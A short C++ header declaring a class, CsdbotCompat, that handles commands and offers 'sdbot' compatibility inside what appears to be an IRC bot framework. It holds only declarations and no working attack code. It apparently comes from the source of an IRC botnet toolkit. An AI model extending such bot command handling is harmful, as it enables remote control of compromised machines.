
#ifndef __SDCOMPAT_H__
#define __SDCOMPAT_H__

#include "cvar.h"
#include "commands.h"
#include "message.h"
#include "irc.h"

class CsdbotCompat : public CCommandHandler
{
public:
	void Init();										// Do initialization here
	int Compat(char *a[256], bool notice, bool silent);	// Insert your sdbot stuff here

	bool HandleCommand(CMessage *pMsg);

	command	m_cmdTest;
};

#endif // __SDCOMPAT_H__
